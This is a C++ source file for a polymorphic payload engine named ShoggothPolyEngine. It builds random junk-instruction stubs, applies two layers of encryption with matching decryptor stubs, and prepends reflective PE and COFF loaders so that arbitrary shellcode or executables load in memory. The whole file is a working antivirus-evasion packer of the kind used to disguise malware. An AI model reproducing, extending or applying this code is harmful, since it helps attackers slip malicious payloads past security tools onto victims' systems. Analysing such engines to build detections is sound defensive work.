#include "ShoggothEngine.h"
#include "AuxFunctions.h"
#include <iostream>


ShoggothPolyEngine::ShoggothPolyEngine(bool shellcodeMode,bool coffMode):
    allRegs{ x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::rsp, x86::rbp, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 },
    generalPurposeRegs { x86::rax, x86::rbx, x86::rcx, x86::rdx, x86::rsi, x86::rdi, x86::r8,x86::r9,x86::r10,x86::r11,x86::r12,x86::r13,x86::r14,x86::r15 }
    {
    this->shellcodeMode = shellcodeMode;
    srand(time(NULL));
    this->StartAsmjit();
}


// *****************************************************

// Resulted form is call + payload + pop garbage + reflective loader
PBYTE ShoggothPolyEngine::AddReflectiveLoader(PBYTE payload, int payloadSize, int& newPayloadSize) {
    int reflectiveLoaderSize = 0;
    int callStubSize = 0;
    int payloadWithCallSize = 0;
    int popStubSize = 0;
    int payloadWithCallAndPopSize = 0;
    int payloadWithLoaderSize = 0;
    char stubFilePath[MAX_PATH] = { 0 };
    PBYTE callStub = NULL;
    PBYTE reflectiveLoader = NULL;
    PBYTE payloadWithCall = NULL;
    PBYTE payloadWithCallAndPop = NULL;
    PBYTE payloadWithLoader = NULL;
    PBYTE popStub = NULL;

    // If you want to use another stub, you should change this hardcoded string
    snprintf(stubFilePath, MAX_PATH, "%s..\\stub\\PELoader.bin", SOLUTIONDIR);
    // Read reflective loader binary
    reflectiveLoader = ReadBinary(stubFilePath, reflectiveLoaderSize);
    if (reflectiveLoader == NULL || reflectiveLoaderSize == 0) {
        return NULL;
    }
    // Put a call to get payload address thanks to call instruction
    callStub = this->GetCallInstructionOverPayload(payloadSize, callStubSize);
    if (callStub == NULL || callStubSize == 0) {
        std::cout << "[!] Error on assembling call instruction for PE Loader!" << std::endl;
        return NULL;
    }
    // Merge input binary and call stub
    payloadWithCall = MergeChunks(callStub, callStubSize, payload, payloadSize);
    VirtualFree(payload, 0, MEM_RELEASE);
    this->asmjitRuntime.release(callStub);
    // VirtualFree(callStub, 0, MEM_RELEASE);
    // New payload size
    payloadWithCallSize = payloadSize + callStubSize;

    // Since input PE address is in stack now, we can create a garbage and pop it.
    popStub = this->GeneratePopWithGarbage(x86::rcx,popStubSize);

    // Merge Call Stub and Pop stub
    payloadWithCallAndPop = MergeChunks(payloadWithCall, payloadWithCallSize, popStub, popStubSize);
    VirtualFree(popStub, 0, MEM_RELEASE);
    VirtualFree(payloadWithCall, 0, MEM_RELEASE);

    // New size
    payloadWithCallAndPopSize = payloadWithCallSize + popStubSize;

    // Merge reflective loader with payload
    payloadWithLoader = MergeChunks(payloadWithCallAndPop, payloadWithCallAndPopSize, reflectiveLoader, reflectiveLoaderSize);
    payloadWithLoaderSize = payloadWithCallAndPopSize + reflectiveLoaderSize;
    VirtualFree(payloadWithCallAndPop, 0, MEM_RELEASE);
    VirtualFree(reflectiveLoader, 0, MEM_RELEASE);
    newPayloadSize = payloadWithLoaderSize;

    return payloadWithLoader;
}


/*
00007FF6BB58511B  xor         r8d,r8d
00007FF6BB58511E  xor         edx,edx
00007FF6BB585120  mov         rcx,qword ptr [test]
*/

PBYTE ShoggothPolyEngine::AddCOFFLoader(PBYTE payload, int payloadSize, PBYTE arguments, int argumentSize, int& newPayloadSize) {
    int coffLoaderSize = 0;
    int callStubSize = 0;
    int payloadWithCallSize = 0;
    int popStubSize = 0;
    int payloadWithCallAndPopSize = 0;
    int payloadWithLoaderSize = 0;
    int payloadAndArgumentSize = 0;
    int newPayloadChunkSize = 0;
    char stubFilePath[MAX_PATH] = { 0 };
    PBYTE payloadAndArgument = NULL;
    PBYTE newPayloadChunk = NULL;
    PBYTE callStub = NULL;
    PBYTE coffLoader = NULL;
    PBYTE payloadWithCall = NULL;
    PBYTE payloadWithCallAndPop = NULL;
    PBYTE payloadWithLoader = NULL;
    PBYTE popStub = NULL;

    // If you want to use another stub, you should change this hardcoded string
    snprintf(stubFilePath, MAX_PATH, "%s..\\stub\\COFFLoader.bin", SOLUTIONDIR);
    // Read reflective loader binary
    coffLoader = ReadBinary(stubFilePath, coffLoaderSize);
    if (coffLoader == NULL || coffLoaderSize == 0) {
        return NULL;
    }
    // Put a call to get payload address thanks to call instruction
    callStub = this->GetCallInstructionOverPayloadAndArguments(payloadSize, argumentSize, callStubSize);
    if (callStub == NULL || callStubSize == 0) {
        std::cout << "[!] Error on assembling call instruction for COFF Loader!" << std::endl;
        return NULL;
    }

    if (arguments) {
        // Argument + argument size + payload
        payloadAndArgument = MergeChunks(arguments, argumentSize, (PBYTE)&argumentSize, sizeof(int));
        payloadAndArgumentSize = argumentSize + sizeof(int);

        newPayloadChunk = MergeChunks(payloadAndArgument, payloadAndArgumentSize, payload, payloadSize);
        newPayloadChunkSize = payloadSize + payloadAndArgumentSize;
        VirtualFree(payload, 0, MEM_RELEASE);
        VirtualFree(payloadAndArgument, 0, MEM_RELEASE);
    }
    else {
        newPayloadChunk = payload;
        newPayloadChunkSize = payloadSize;
    }
    
    // Merge input binary and call stub
    payloadWithCall = MergeChunks(callStub, callStubSize, newPayloadChunk, newPayloadChunkSize);
    
    this->asmjitRuntime.release(callStub);
    // VirtualFree(callStub, 0, MEM_RELEASE);
    // New payload size
    payloadWithCallSize = payloadSize + callStubSize;

    // Since input PE address is in stack now, we can create a garbage and pop it.
    popStub = this->GenerateThreePopWithGarbage(x86::rcx, x86::rdx, x86::r8,argumentSize, popStubSize);

    // Merge Call Stub and Pop stub
    payloadWithCallAndPop = MergeChunks(payloadWithCall, payloadWithCallSize, popStub, popStubSize);
    VirtualFree(popStub, 0, MEM_RELEASE);
    VirtualFree(payloadWithCall, 0, MEM_RELEASE);

    // New size
    payloadWithCallAndPopSize = payloadWithCallSize + popStubSize;

    // Merge reflective loader with payload
    payloadWithLoader = MergeChunks(payloadWithCallAndPop, payloadWithCallAndPopSize, coffLoader, coffLoaderSize);
    payloadWithLoaderSize = payloadWithCallAndPopSize + coffLoaderSize;
    VirtualFree(payloadWithCallAndPop, 0, MEM_RELEASE);
    VirtualFree(coffLoader, 0, MEM_RELEASE);
    newPayloadSize = payloadWithLoaderSize;

    return payloadWithLoader;
}


PBYTE ShoggothPolyEngine::GenerateThreePopWithGarbage(x86::Gp payloadReg, x86::Gp argumentReg, x86::Gp argumentSizeReg, int argumentSize, int& popStubSize) {
    PBYTE popPtr = NULL;
    PBYTE returnValue = NULL;
    int garbageSize = 0;
    int popSize = 0;

    PBYTE garbageInstructions = this->GenerateRandomGarbage(garbageSize);
    // Argument + argument size + payload
    asmjitAssembler->pop(argumentReg);
    if (argumentSize) {
        asmjitAssembler->mov(argumentSizeReg, argumentReg);
        asmjitAssembler->mov(payloadReg, argumentReg);
        asmjitAssembler->add(argumentSizeReg, argumentSize);
        asmjitAssembler->add(payloadReg, argumentSize + sizeof(int));
    }
    else {
        asmjitAssembler->mov(payloadReg, argumentReg);
        asmjitAssembler->add(payloadReg, sizeof(int));
        asmjitAssembler->xor_(argumentReg,argumentReg);
        asmjitAssembler->xor_(argumentSizeReg,argumentSizeReg);
    }
    popPtr = this->AssembleCodeHolder(popSize);
    returnValue = MergeChunks(garbageInstructions, garbageSize, popPtr, popSize);
    popStubSize = garbageSize + popSize;
    VirtualFree(garbageInstructions, 0, MEM_RELEASE);
    this->asmjitRuntime.release(popPtr);
    return returnValue;
}

PBYTE  ShoggothPolyEngine::GeneratePopWithGarbage(x86::Gp popReg, int& popStubSize) {
    PBYTE popPtr = NULL;
    PBYTE returnValue = NULL;
    int garbageSize = 0;
    int popSize = 0;
    // Generate garbage instructions
    PBYTE garbageInstructions = this->GenerateRandomGarbage(garbageSize);
    // put pop to the rcx
    asmjitAssembler->pop(x86::rcx);
    popPtr = this->AssembleCodeHolder(popSize);
    returnValue = MergeChunks(garbageInstructions, garbageSize, popPtr, popSize);
    popStubSize = garbageSize + popSize;
    VirtualFree(garbageInstructions, 0, MEM_RELEASE);
    this->asmjitRuntime.release(popPtr);
    // 
    // VirtualFree(popPtr, 0, MEM_RELEASE);
    return returnValue;
}

void ShoggothPolyEngine::DebugBuffer(PBYTE buffer, int bufferSize) {
    // Save the buffer as assembletest.bin for debug purposes
    FILE* hFile = fopen("assembletest.bin", "wb");

    if (hFile != NULL)
    {
        fwrite(buffer, bufferSize, 1, hFile);
        fclose(hFile);
    }
}


PBYTE ShoggothPolyEngine::AssembleCodeHolder(int& codeSize) {
    // Get the current code holder code
    Func functionPtr;
    endOffset = this->asmjitAssembler->offset();
    codeSize = endOffset - startOffset;
    Error err = this->asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
    // returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSize);
    // memcpy(returnValue, functionPtr, codeSize);
    this->ResetAsmjit();
    return (PBYTE)functionPtr;
}


void ShoggothPolyEngine::MixupArrayRegs(x86::Reg* registerArr, WORD size) {
    x86::Reg temp;
    for (int i = size - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        // Swap arr[i] with the element
        temp = registerArr[i];
        registerArr[i] = registerArr[j];
        registerArr[j] = temp;
    }
}



void ShoggothPolyEngine::StartAsmjit() {
    asmjitCodeHolder.init(asmjitRuntime.environment());
    asmjitAssembler = new x86::Assembler(&asmjitCodeHolder);
    startOffset = asmjitAssembler->offset();
}

void ShoggothPolyEngine::ResetAsmjit() {
    asmjitCodeHolder.reset();
    startOffset = 0;
    endOffset = 0;
    this->StartAsmjit();
}


PBYTE ShoggothPolyEngine::PushAllRegisters(int &codeSize) {
    this->MixupArrayRegs(this->allRegs, 16);
    for (int i = 0; i < 16; i++) {
        asmjitAssembler->push(this->allRegs[i]);
    }
    return this->AssembleCodeHolder(codeSize);
}

PBYTE ShoggothPolyEngine::PopAllRegisters(int& codeSize) {
    for (int i = 0; i < 16; i++) {
        asmjitAssembler->pop(this->allRegs[i]);
    }
    return this->AssembleCodeHolder(codeSize);
}

x86::Gp ShoggothPolyEngine::GetRandomRegister() {
    this->MixupArrayRegs(this->allRegs, 16);
    return this->allRegs[RandomizeInRange(0, 15)];
}

x86::Gp ShoggothPolyEngine::GetRandomGeneralPurposeRegister() {
    this->MixupArrayRegs(this->generalPurposeRegs, 14);
    return this->generalPurposeRegs[RandomizeInRange(0, 13)];
}


PBYTE ShoggothPolyEngine::StartPolymorphicEncrypt(PBYTE payload, int payloadSize, int &encryptedSize) {
    int firstGarbageSize = 0;
    int firstGarbageWithPayloadSize = 0;
    int firstDecryptorAndEncryptedPayloadSize = 0;
    int firstEncryptedPayloadSize = 0;
    int secondEncryptedSize = 0;
    int secondDecryptorAndEncryptedPayloadSize = 0;
    int firstKeySize = RandomizeInRange(1, 256);
    int popStubSize = 0;
    int pushStubSize = 0;
    int returnSize = 0;
    PBYTE firstGarbage = NULL;
    PBYTE firstGarbageWithPayload = NULL;
    PBYTE firstEncryptedPayload = NULL;
    PBYTE firstDecryptorAndEncryptedPayload = NULL;
    PBYTE firstEncryptionKey = GetRandomBytes(firstKeySize);
    PBYTE secondEncryptedPayload = NULL;
    PBYTE secondDecryptorAndEncryptedPayload = NULL;
    PBYTE popStub = NULL;
    PBYTE pushStub = NULL;
    PBYTE returnValue = NULL;
    
    // Add pop instructions at the end of the payload - Meaningless for PE Loading
    if (this->shellcodeMode) {
        PBYTE oldPayload = payload;
        popStub = this->PopAllRegisters(popStubSize);
        payload = MergeChunks(payload, payloadSize, popStub, popStubSize);
        VirtualFree(oldPayload, 0, MEM_RELEASE);
        this->asmjitRuntime.release(popStub);

        payloadSize += popStubSize;
    }
    

    // Get Some Garbage Instructions
    firstGarbage = this->GenerateRandomGarbage(firstGarbageSize);
    

    firstGarbageWithPayload = MergeChunks(firstGarbage, firstGarbageSize, payload, payloadSize);
    VirtualFree(payload, 0, MEM_RELEASE);
    VirtualFree(firstGarbage, 0, MEM_RELEASE);
    firstGarbageWithPayloadSize = payloadSize + firstGarbageSize;

    std::cout << "[+] First randomly generated garbage instruction stub is added!" << std::endl;

    // Encrypt garbage + payload
    firstEncryptedPayload = this->FirstEncryption(firstGarbageWithPayload, firstGarbageWithPayloadSize, firstEncryptionKey, firstKeySize);
    firstEncryptedPayloadSize = firstGarbageWithPayloadSize;

    std::cout << "[+] First encryption is performed!" << std::endl;

    // Append Decryptor stub
    firstDecryptorAndEncryptedPayload = this->FirstDecryptor(firstEncryptedPayload, firstEncryptedPayloadSize, firstEncryptionKey, firstKeySize, firstDecryptorAndEncryptedPayloadSize);
    std::cout << "[+] First decryptor stub is generated and merged!" << std::endl;
    
    // Apply second encryption
    secondEncryptedPayload = this->SecondEncryption(firstDecryptorAndEncryptedPayload, firstDecryptorAndEncryptedPayloadSize, secondEncryptedSize);
    std::cout << "[+] Second encryption is performed!" << std::endl;
    
    // Merge second decryptor
    secondDecryptorAndEncryptedPayload = this->SecondDecryptor(secondEncryptedPayload, secondEncryptedSize, secondDecryptorAndEncryptedPayloadSize);
    std::cout << "[+] Second decryptor stub is generated and merged!" << std::endl;
    
    // Arrange return values
    encryptedSize = secondDecryptorAndEncryptedPayloadSize;
    returnValue = secondDecryptorAndEncryptedPayload;

    // Add push instructions at the beginning of the payload - Meaningless for PE Loading
    if (this->shellcodeMode) {
        // Arrange return values again for push registers
        pushStub = this->PushAllRegisters(pushStubSize);
        returnValue = MergeChunks(pushStub, pushStubSize, secondDecryptorAndEncryptedPayload, secondDecryptorAndEncryptedPayloadSize);
        VirtualFree(secondDecryptorAndEncryptedPayload, 0, MEM_RELEASE);
        this->asmjitRuntime.release(pushStub);
        encryptedSize += pushStubSize;
    }
    HeapFree(GetProcessHeap(), NULL, firstEncryptionKey);
    return returnValue;
}

PBYTE ShoggothPolyEngine::GetCallInstructionOverPayloadAndArguments(int payloadSize,int argumentSize, int& callSize) {
    this->asmjitCodeHolder.flatten();
    this->asmjitCodeHolder.relocateToBase(0x00);
    int callOffset = payloadSize + argumentSize;
    // Directly generate a call instruction over payloadsize
    if (argumentSize) {
        callOffset += sizeof(int);
    }
    asmjitAssembler->call(callOffset + 5);
    // Assemble the buffer
    return this->AssembleCodeHolder(callSize);
}

PBYTE ShoggothPolyEngine::GetCallInstructionOverPayload(int payloadSize,int &callSize) {
    this->asmjitCodeHolder.flatten();
    this->asmjitCodeHolder.relocateToBase(0x00);
    // Directly generate a call instruction over payloadsize
    asmjitAssembler->call(payloadSize + 5);
    // Assemble the buffer
    return this->AssembleCodeHolder(callSize);
}

PBYTE ShoggothPolyEngine::GetPopInstructionAfterPayload(int& popSize) {
    asmjitAssembler->pop(this->addressHolderForSecondEncryption);
    return this->AssembleCodeHolder(popSize);
}


PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
    PBYTE garbageInstructions;
    PBYTE jmpOverRandomByte;
    int codeSizeGarbage = 0;
    int codeSizeJmpOver = 0;
    PBYTE returnValue = NULL;
    // Get garbage instructions
    this->GenerateGarbageInstructions();
    garbageInstructions = this->AssembleCodeHolder(codeSizeGarbage);
    // garbageInstTest = (Func)garbageInstructions;
    // VirtualProtect(garbageInstructions, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
    // garbageInstTest();
    // Generate jmp over random byte
    this->GenerateJumpOverRandomData();
    jmpOverRandomByte = this->AssembleCodeHolder(codeSizeJmpOver);
    // jmpOverRandomByteTest = (Func)jmpOverRandomByte;
    // VirtualProtect(jmpOverRandomByteTest, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
    // jmpOverRandomByteTest();
    if (RandomizeBool()) {
        returnValue = MergeChunks(jmpOverRandomByte, codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
    }
    else {
        returnValue = MergeChunks(garbageInstructions, codeSizeGarbage, jmpOverRandomByte, codeSizeJmpOver);
    }
    garbageSize = codeSizeJmpOver + codeSizeGarbage;
    this->asmjitRuntime.release(garbageInstructions);
    this->asmjitRuntime.release(jmpOverRandomByte);
    return returnValue;
}

 // Tested
void ShoggothPolyEngine::GenerateJumpOverRandomData() {
    size_t randomSize = RandomizeInRange(30, 50);
    PBYTE randomBytes = GetRandomBytes(randomSize);
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);
    asmjitAssembler->jmp(randomLabelJmp);
    asmjitAssembler->embed(randomBytes, randomSize);
    asmjitAssembler->bind(randomLabelJmp);
    HeapFree(GetProcessHeap(), NULL, randomBytes);
    HeapFree(GetProcessHeap(), NULL, randomString);
    // this->DebugCurrentCodeBuffer();
}

void ShoggothPolyEngine::GenerateGarbageInstructions() {
    int randomValue = RandomizeInRange(1, 4);
    switch (randomValue) {
        case 1:
            this->GenerateGarbageFunction();
            break;
        case 2:
            this->GenerateSafeInstruction();
            break;
        case 3:
            this->GenerateReversedInstructions();
            break;
        case 4:
            this->GenerateJumpedInstructions();
            break;
        default:
            break;
    }
}

void ShoggothPolyEngine::GenerateGarbageFunction() {
    BYTE randomByte = (BYTE)RandomizeInRange(1, 255);
    if (RandomizeBool())
    {
        asmjitAssembler->push(x86::rbp);
        asmjitAssembler->mov(x86::rbp, x86::rsp);
        asmjitAssembler->sub(x86::rsp, randomByte);

    }
    else {
        asmjitAssembler->enter(imm(0), imm(0));
    }
    this->GenerateGarbageInstructions();
    if (RandomizeBool())
    {
        asmjitAssembler->leave();
    }
    else
    {
        // equivalent to "leave"
        asmjitAssembler->mov(x86::rsp, x86::rbp);
        asmjitAssembler->pop(x86::rbp);
    }
}

// Generates only one instruction which doesn't have any affect
void ShoggothPolyEngine::GenerateSafeInstruction() {
    int randomIndexForSelect = RandomizeInRange(1, 33);
    x86::Gp randomRegister = this->GetRandomRegister();
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);

    switch (randomIndexForSelect) {
    case 1:
        // Nop instruction +
        asmjitAssembler->nop();
        break;
    case 2:
        // Cld instruction - Clear Direction flag in EFLAGS +
        asmjitAssembler->cld();
        break;
    case 3:
        // CLC instruction - Clear carry flag +
        asmjitAssembler->clc();
        break;
    case 4:
        // CMC instruction - Complement carry flag +
        asmjitAssembler->cmc();
        break;
    case 5:
        // fwait instruction - Causes the processor to check for and handle pending, unmasked, floating-point exceptions before proceedin + VSde okey
        asmjitAssembler->fwait();
        break;
    case 6:
        // fnop instruction - Performs no FPU operation. +
        asmjitAssembler->fnop();
        break;
    case 7:
        // fxam instruction - The fxam instruction examines the value in st(0) and reports the results in the condition code bits +
        asmjitAssembler->fxam();
        break;
    case 8:
        // ftst instruction - The FTST instruction compares the value on the top of stack with zero. +
        asmjitAssembler->ftst();
        break;
    case 9:
        // jmp - pass the next inst
        asmjitAssembler->jmp(randomLabelJmp);
        asmjitAssembler->bind(randomLabelJmp);
        break;
    case 10:
        // xor register,0 - nothing changes +
        asmjitAssembler->xor_(randomRegister, 0);
        break;
    case 11:
        // bt register, register - The CF flag contains the value of the selected bit. +
        asmjitAssembler->bt(randomRegister, randomRegister);
        break;
    case 12:
        // cmp - compare instruction + 
        asmjitAssembler->cmp(randomRegister, randomRegister);
        break;
    case 13:
        // mov instruction +
        asmjitAssembler->mov(randomRegister, randomRegister);
        break;
    case 14:
        // xchg - The XCHG (exchange data) instruction exchanges the contents of two operands. VSde okey
        asmjitAssembler->xchg(randomRegister, randomRegister);
        break;
    case 15:
        // test - bitwise and +
        asmjitAssembler->test(randomRegister, randomRegister);
        break;
    case 16:
        // cmova - The cmova conditional move if above check the state of CF AND ZF. +
        asmjitAssembler->cmova(randomRegister, randomRegister);
        break;
    case 17:
        // cmovb - The cmovb conditional move if below check the state of CF. +
        asmjitAssembler->cmovb(randomRegister, randomRegister);
        break;
    case 18:
        // cmove - similar +
        asmjitAssembler->cmove(randomRegister, randomRegister);
        break;
    case 19:
        // cmovg +
        asmjitAssembler->cmovg(randomRegister, randomRegister);
        break;
    case 20:
        // cmovl +
        asmjitAssembler->cmovl(randomRegister, randomRegister);
        break;
    case 21:
        // cmovo +
        asmjitAssembler->cmovo(randomRegister, randomRegister);
        break;
    case 22:
        // cmovp +
        asmjitAssembler->cmovp(randomRegister, randomRegister);
        break;
    case 23:
        // cmovs +
        asmjitAssembler->cmovs(randomRegister, randomRegister);
        break;
    case 24:
        // cmovae +
        asmjitAssembler->cmovae(randomRegister, randomRegister);
        break;
    case 25:
        // cmovge +
        asmjitAssembler->cmovge(randomRegister, randomRegister);
        break;
    case 26:
        // cmovle +
        asmjitAssembler->cmovle(randomRegister, randomRegister);
        break;
    case 27:
        // cmovne
        asmjitAssembler->cmovne(randomRegister, randomRegister);
        break;
    case 28:
        // cmovng
        asmjitAssembler->cmovng(randomRegister, randomRegister);
        break;
    case 29:
        // cmovnl
        asmjitAssembler->cmovnl(randomRegister, randomRegister);
        break;
    case 30:
        // cmovno
        asmjitAssembler->cmovno(randomRegister, randomRegister);
        break;
    case 31:
        // cmovnp +
        asmjitAssembler->cmovnp(randomRegister, randomRegister);
        break;
    case 32:
        // cmovns + 
        asmjitAssembler->cmovns(randomRegister, randomRegister);
        break;
    case 33:
        // cmovbe +
        asmjitAssembler->cmovbe(randomRegister, randomRegister);
        break;
    default:
        ;
    }
    HeapFree(GetProcessHeap(), NULL, randomString);
}

void ShoggothPolyEngine::GenerateReversedInstructions() {
    int randomIndexForSelect = RandomizeInRange(1, 10);
    x86::Gp randomRegister = this->GetRandomRegister();
    BYTE randomByte = (BYTE)(RandomizeInRange(0, 255));
    BYTE randomRotate = (BYTE)(RandomizeInRange(0, 64));
    switch (randomIndexForSelect) {
    case 1:
        // not register;garbage;not register +
        asmjitAssembler->not_(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->not_(randomRegister);
        break;
    case 2:
        // neg register;garbage;neg register +
        asmjitAssembler->neg(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->neg(randomRegister);
        break;
    case 3:
        // inc register;garbage;dec register + 
        asmjitAssembler->inc(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->dec(randomRegister);
        break;
    case 4:
        // dec register;garbage;inc register +
        asmjitAssembler->dec(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->inc(randomRegister);
        break;
    case 5:
        // push register;garbage;pop register +
        asmjitAssembler->push(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->pop(randomRegister);
        break;
    case 6:
        // bswap register;garbage;bswap register +
        asmjitAssembler->bswap(randomRegister);
        this->GenerateGarbageInstructions();
        asmjitAssembler->bswap(randomRegister);
        break;
    case 7:
        // add register,value ;garbage;sub register,value +
        asmjitAssembler->add(randomRegister, randomByte);
        this->GenerateGarbageInstructions();
        asmjitAssembler->sub(randomRegister, randomByte);
        break;
    case 8:
        // sub register,value ;garbage;add register,value +
        asmjitAssembler->sub(randomRegister, randomByte);
        this->GenerateGarbageInstructions();
        asmjitAssembler->add(randomRegister, randomByte);
        break;
    case 9:
        // ror register,value ;garbage;rol register,value +
        asmjitAssembler->ror(randomRegister, randomRotate);
        this->GenerateGarbageInstructions();
        asmjitAssembler->rol(randomRegister, randomRotate);
        break;
    case 10:
        // rol register,value ;garbage;ror register,value +
        asmjitAssembler->rol(randomRegister, randomRotate);
        this->GenerateGarbageInstructions();
        asmjitAssembler->ror(randomRegister, randomRotate);
        break;
    default:
        break;
    }
}

void ShoggothPolyEngine::GenerateJumpedInstructions() {
    int randomIndexForSelect = RandomizeInRange(1, 16);
    x86::Gp randomRegister = this->GetRandomRegister();
    char* randomString = GenerateRandomString();
    Label randomLabelJmp = asmjitAssembler->newNamedLabel(randomString, 16);
    switch (randomIndexForSelect) {
        case 1:
            // jmp label;garbage;label: +
            asmjitAssembler->jmp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 2:
            asmjitAssembler->jae(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 3:
            asmjitAssembler->ja(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 4:
            asmjitAssembler->jbe(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 5:
            asmjitAssembler->jb(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 6:
            asmjitAssembler->je(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 7:
            asmjitAssembler->jge(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 8:
            asmjitAssembler->jg(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 9:
            asmjitAssembler->jle(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 10:
            asmjitAssembler->jl(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 11:
            asmjitAssembler->jne(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 12:
            asmjitAssembler->jnp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 13:
            asmjitAssembler->jns(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 14:
            asmjitAssembler->jo(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 15:
            asmjitAssembler->jp(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        case 16:
            asmjitAssembler->js(randomLabelJmp);
            this->GenerateGarbageInstructions();
            asmjitAssembler->bind(randomLabelJmp);
            break;
        default:
            break;
    }
}

void ShoggothPolyEngine::RandomUnsafeGarbage() {
    x86::Gp randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
    x86::Gp randomGeneralPurposeRegisterSource = this->GetRandomGeneralPurposeRegister();
    int randomIndexForSelect = RandomizeInRange(1, 16);
    while (randomGeneralPurposeRegisterDest.id() == randomGeneralPurposeRegisterSource.id()) {
        randomGeneralPurposeRegisterDest = this->GetRandomGeneralPurposeRegister();
    }
    asmjitAssembler->push(randomGeneralPurposeRegisterDest);
    BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
    //TODO : ADD memory examples, 
    switch (randomIndexForSelect) {
    case 1:
        asmjitAssembler->add(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 2:
        asmjitAssembler->sub(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 3:
        asmjitAssembler->xor_(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 4:
        asmjitAssembler->shl(randomGeneralPurposeRegisterDest, randomValue);
        break;
    case 5:
        asmjitAssembler->shr(randomGeneralPurposeRegisterDest, randomValue);
        break;
    default:
        break;
    }
    asmjitAssembler->pop(randomGeneralPurposeRegisterDest);
}